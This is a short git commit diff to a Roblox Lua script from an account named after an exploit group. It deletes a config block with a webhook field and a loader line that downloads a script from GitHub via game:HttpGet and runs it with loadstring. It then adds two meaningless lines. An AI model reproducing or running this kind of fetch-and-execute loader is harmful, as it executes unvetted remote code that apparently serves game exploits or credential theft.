9bc5422b89d917ffc5058131058acbd6947b8c62
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 16:47:08 +0200

    Overwrite MyBot321.lua

--- scripts/MyBot321.lua
+++ scripts/MyBot321.lua
@@ -1,5 +1,2 @@
-Username = "fs"
-Username2 = "fs"
-Webhook = "https.com"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Gen-v2/main/scripts/MyBot321.lua"))()
+hello
+loadstrinf123
